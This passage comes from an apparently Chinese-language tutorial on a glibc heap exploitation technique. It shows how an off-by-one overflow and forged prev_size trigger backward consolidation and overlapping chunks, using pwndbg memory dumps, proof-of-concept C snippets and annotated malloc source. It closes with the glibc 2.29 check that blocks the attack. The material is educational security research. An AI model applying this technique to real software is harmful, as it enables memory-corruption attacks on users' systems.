0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210 #unsortedbin指针不会被清空
0x555555757780:	0x0000555555757760	0x0000555555757760 #largebin指针不会清空
......
0x555555757c70:	0x0000000000000000	0x00000000000004f1 #remainder(unsortedbin)
0x555555757c80:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555758160:	0x00000000000004f0	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
......
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg> unsortedbin
unsortedbin
all: 0x555555757c70 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757c70 /* 'p|uUUU' */
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x555555757760
Size: 0x511

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555757c70
Size: 0x4f1
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x555555758160
Size: 0x00

pwndbg> 
```

> 为了之后的叙述方便，我们将现在处于unsortedbin中的那个堆块称为remainder。
>

如果细心的话可以发现上述代码框中有一个大小为0x00的堆块，并且在正常情况下heap命令应该额外打印出c、barrier和top_chunk这三个堆块；仔细想想就可以知道由于我们在POC中将b堆块的大小通过off-by-one减小了0x10，因此在对堆块进行切割之后会“多出来0x10”的空间，**<font style="color:#F5222D;">由于堆块的虚拟地址空间都是连续的</font>**，这样会导致gdb认为此堆块的大小为0x00。

接下来我们继续调试，如下代码中会申请大小为0x480的堆块：

```c
	printf("We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control

	b2 = malloc(0x480);
	printf("b2: %p\n",b2);
```

现在的last_remainder为空，如下图所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620118719478-bf4930c8-7ce8-4012-a27f-0126893d21f9.png)

可以遇见的是我们会将remainder（不是last_remainder）这个堆块先整理到largebin中然后对其进行切割：

首先放入largebin中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620120286133-5d1cc5b9-3c12-4ce6-8c5f-84759c24b05e.png)

> 注意largebin链上的0x4c0并不代表其中堆块的实际结构，具体原因参见largebin数据结构。
>

因为nb对应大小的largebin链表上没有合适的堆块，标记在binmap中标记bit之后准备对这个堆块进行切割：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620132786606-8342cd26-dc33-476e-92dd-45635c8bd45c.png)

切割的步骤和之前相同，这里不再多说，直接看一下效果：

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000511 #b1(malloc)
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210 #unsortedbin指针不会被清空
0x555555757780:	0x0000555555757760	0x0000555555757760 #largebin指针不会清空
......
0x555555757c70:	0x0000000000000000	0x0000000000000491 #b2(malloc)
0x555555757c80:	0x00007ffff7dce0c0	0x00007ffff7dce0c0 #指针不会被清空
0x555555757c90:	0x0000555555757c70	0x0000555555757c70 #指针不会被清空
......
0x555555758100:	0x0000000000000000	0x0000000000000061 #remainder(free-unsortedbin)
0x555555758110:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555758160:	0x0000000000000060	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
......
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620133527780-6c006649-827b-49e5-aa3c-9129f400f66f.png)

同样，这里gdb的heap出现了问题，这里不管他。为了方便查看，接下来的POC代码对b2堆块进行填充：

```c
	memset(b2,'B',0x480);
	printf("Current b2 content:\n%s\n",b2);
```

```c
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000511 #b1(malloc)
0x555555757770:	0x00007ffff7dce210	0x00007ffff7dce210 #unsortedbin指针不会被清空
0x555555757780:	0x0000555555757760	0x0000555555757760 #largebin指针不会清空
......
0x555555757c70:	0x0000000000000000	0x0000000000000491 #b2(malloc)
0x555555757c80:	0x4242424242424242	0x4242424242424242 #填充
0x555555757c90:	0x4242424242424242	0x4242424242424242 #填充
......
0x5555557580f0:	0x4242424242424242	0x4242424242424242 #填充
0x555555758100:	0x0000000000000000	0x0000000000000061 #remainder(free-unsortedbin)
0x555555758110:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555758160:	0x0000000000000060	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
......
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

接下来我们对申请的b1堆块再次进行free：

```c
	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1);
```

这次free后会将b1放入到unsortedbin中，这个过程没有什么好说的，结果如下：

```c
pwndbg> bin
//......
unsortedbin
all: 0x555555757760 —▸ 0x555555758100 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757760 /* '`wuUUU' */
smallbins
empty
largebins
empty
pwndbg> x/800gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
......
0x555555757250:	0x0000000000000000	0x0000000000000511 #a(malloc)
......
0x555555757760:	0x0000000000000000	0x0000000000000511 #b1(free)
0x555555757770:	0x0000555555758100	0x00007ffff7dcdca0 #changed
				#fd					#bk
0x555555757780:	0x0000000000000000	0x0000000000000000 #changed
......
0x555555757c70:	0x0000000000000510	0x0000000000000490 #changed #b2(malloc)
0x555555757c80:	0x4242424242424242	0x4242424242424242 #填充
0x555555757c90:	0x4242424242424242	0x4242424242424242 #填充
......
0x5555557580f0:	0x4242424242424242	0x4242424242424242 #填充
0x555555758100:	0x0000000000000000	0x0000000000000061 #remainder(free-unsortedbin)
0x555555758110:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555758160:	0x0000000000000060	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(malloc)
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)
......
0x555555758790:	0x0000000000000000	0x000000000001f871 #top_chunk
......
0x5555557588f0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

接下来又是一个重点，这次free牵扯到堆块的合并问题：

```c
	free(c);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620134877077-ad8d4368-433b-47bb-9f81-4de1e349bb2f.png)

我们调试到如上图所示的地方，我们将malloc源码单独的摘出来看一下：

```c
    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); //清空堆块的内容
-------------------------------------------------------------------
#此时的堆块内存如下：
0x555555757760:	0x0000000000000000	0x0000000000000511 #b1(malloc)
0x555555757770:	0x0000555555758100	0x00007ffff7dcdca0 #changed
				#fd					#bk
0x555555757780:	0x0000000000000000	0x0000000000000000 #changed
......
0x555555757c70:	0x0000000000000510	0x0000000000000490 #changed #b2(malloc)
0x555555757c80:	0x4242424242424242	0x4242424242424242
0x555555757c90:	0x4242424242424242	0x4242424242424242
......
0x5555557580f0:	0x4242424242424242	0x4242424242424242
0x555555758100:	0x0000000000000000	0x0000000000000061 #remainder(free-unsortedbin)
0x555555758110:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555758160:	0x0000000000000060	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(free) 【malloc源码中的p堆块】
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)【malloc源码中的nextchunk】
-------------------------------------------------------------------
    /* consolidate backward */ //向后合并
    if (!prev_inuse(p)) { //prev_inuse(p):获取p的PREV_INUSE标志位==0
    	//进入if语句，p的PREV_INUSE标志位代表着p之前的堆块的状态，现在处于free状态
      prevsize = prev_size (p); //获取p的mchunk_prev_size==0xa10
      size += prevsize; //size=size+prevsize->size==0xa10+0x510=0xf20
      p = chunk_at_offset(p, -((long) prevsize)); 
      	//#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
        //p==0x555555757760
      unlink(av, p, bck, fwd); //对p堆块进行unlink
    }
```

unlink之后结果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620136248681-222f18f7-6985-4642-9c30-958a3b559571.png)

最终执行如下代码：

```c
    if (nextchunk != av->top) {
      /* get and clear inuse bit */  
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //nextinuse==1
			#define inuse_bit_at_offset(p, s)					      \
  			#(((mchunkptr) (((char *) (p)) + (s)))->mchunk_size & PREV_INUSE)
      /* consolidate forward */   //向前合并
      if (!nextinuse) { //这里的nextinuse代表着p的下一个的下一个堆块的PREV_INUSE标志位情况
          //现在不会进入if语句
	unlink(av, nextchunk, bck, fwd); //如果p的下一个堆块也处于free状态，则进行合并
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);
	/*
	Place the chunk in unsorted chunk list. Chunks are
	not placed into regular bins until after they have
	been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);---------------------------------
      fwd = bck->fd;											｜
      if (__glibc_unlikely (fwd->bk != bck))					｜-->unsortedbin双向链表完整性检查
	malloc_printerr ("free(): corrupted unsorted chunks");-------
      p->fd = fwd;----------------------------
      p->bk = bck;							 ｜
      if (!in_smallbin_range(size))			 ｜
	{										 ｜
	  p->fd_nextsize = NULL;				 ｜---->p堆块链入unsortedbin中
	  p->bk_nextsize = NULL;				 ｜
	}										 ｜
      bck->fd = p;							 ｜
      fwd->bk = p;----------------------------

      set_head(p, size | PREV_INUSE); //size|PREV_INUSE==0xf20|0x1==0xf21
      set_foot(p, size); //size==0xf20

      check_free_chunk(av, p);
    }
```

执行完毕后部分内存如下：

```c
pwndbg> x/800gx 0x555555757000
.....
0x555555757760:	0x0000000000000000	0x0000000000000f21 #b1(malloc)-------------------
    								#set_head										|
0x555555757770:	0x0000555555758100	0x00007ffff7dcdca0 								|
				#fd					#bk												|
0x555555757780:	0x0000000000000000	0x0000000000000000 								|
......																				|
0x555555757c70:	0x0000000000000510	0x0000000000000490 #b2(malloc)					|
0x555555757c80:	0x4242424242424242	0x4242424242424242								|
0x555555757c90:	0x4242424242424242	0x4242424242424242		   b1实际控制的区域 <-----｜
......																				｜
0x5555557580f0:	0x4242424242424242	0x4242424242424242								｜
0x555555758100:	0x0000000000000000	0x0000000000000061 #remainder(free-unsortedbin) ｜
0x555555758110:	0x00007ffff7dcdca0	0x00007ffff7dcdca0								｜
......																				｜
0x555555758160:	0x0000000000000060	0x0000000000000000								｜
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(free)						｜
......																				｜
0x555555758680:	0x0000000000000f20	0x0000000000000110 #barrier(malloc)--------------
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x511

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555757760
Size: 0xf21
fd: 0x555555758100
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x555555758680
Size: 0x110

Top chunk | PREV_INUSE
Addr: 0x555555758790
Size: 0x1f871

pwndbg>
```

注意上面代码框中的内容，现在b1堆块的大小已经扩展到了0xf21！！！

我们回头看看究竟是哪一步出现了问题：

1. 在POC的一开始我们创建了4个堆块，其名称和实际大小分别为a==0x511，b==0xa11，c==0x511、barrier==0x111。
2. 接下来假如存在UAF等漏洞修改b的user_data末尾（c堆块的起始0x10）为0xa00，然后free掉b使其进入unsortedbin。
3. 然后使用单字节溢出漏洞将b的大小修改为0xa00，此时b的大小减少了0x10（之前的修改是为了接下来申请绕过调用unlink时的检查）
4. 之后申请实际大小为0x500的堆块（b1），这时会对在unsortedbin中的b堆块调用unlink进行解链切割
5. 然后我们再次申请实际大小为0x491的堆块，这个堆块也会在unsortedbin中进行切割，分配之后的堆块称作b2，我们将b2当作要收到攻击的堆块--victim
6. 接下来free b1让其进入unsortedbin中，紧接着free c堆块，由于c堆块的mchunk_prev_size==0xa10且c的标志位PREV_INUSE==0x0，**<font style="color:#F5222D;">并且c的mchunk_prev_size==0xa10，因此会根据触发合并并依据mchunk_prev_size确定合并的大小。（漏洞所在）</font>**
7. 合并之后就会导致a的大小扩展到0xf21，发生堆块重叠，现在可以为所欲为了。

> **<font style="color:#F5222D;">触发合并的条件：堆块的PREV_INUSE标志位为0（这一点可以通过堆溢出伪造）</font>**
>

---

这里再理清两个概念：

+ 向后合并：指当free某个堆块时，如果之前的一个堆块也处于free状态，则站在前一个堆块的立场来看堆块发生向后合并。
+ 向前合并：指当free某个堆块时，如果之后的一个堆块也处于free状态，则站在后一个堆块的立场来看堆块发生向前合并。

---

为所欲为ing：

```c
	printf("Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0xc00);
	printf("d: %p\n",d);
	
	printf("Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0xc00);

	printf("New b2 content:\n%s\n",b2);

	printf("Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
		"for the clear explanation of this technique.\n");
```

## 漏洞修补--glibc-2.29
在全新的glibc 2.29的版本中，在“向后合并”时加入了检测机制，这导致我们无法滥用向后合并：

```c
/* consolidate backward */
if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
    unlink_chunk (av, p);
}
```

放在内存中就是检测在释放c堆块向后合并堆块时：

```c
-------------------------------------------------------------------
0x555555757760:	0x0000000000000000	0x0000000000000511 #b1(malloc)
    								#检测2:chunksize(p)==0x510
0x555555757770:	0x0000555555758100	0x00007ffff7dcdca0 #changed
				#fd					#bk
0x555555757780:	0x0000000000000000	0x0000000000000000 #changed
......
0x555555757c70:	0x0000000000000510	0x0000000000000490 #changed #b2(malloc)
0x555555757c80:	0x4242424242424242	0x4242424242424242
0x555555757c90:	0x4242424242424242	0x4242424242424242
......
0x5555557580f0:	0x4242424242424242	0x4242424242424242
0x555555758100:	0x0000000000000000	0x0000000000000061 #remainder(free-unsortedbin)
0x555555758110:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555758160:	0x0000000000000060	0x0000000000000000
0x555555758170:	0x0000000000000a10	0x0000000000000510 #c(free) 【malloc源码中的p堆块】
				#检测1【prevsize==0xa10】
                //0x555555758170-0xa10==0x555555757760
......
0x555555758680:	0x0000000000000000	0x0000000000000111 #barrier(malloc)【malloc源码中的nextchunk】
-------------------------------------------------------------------
```

如上面代码框中的内容所示，很明显对两个堆块的不同位置进行了检查，这样我们就无法使用之前的攻击方式进行攻击。当然这种修补方式仍然可以绕过，这里先按下不表。

# 例题
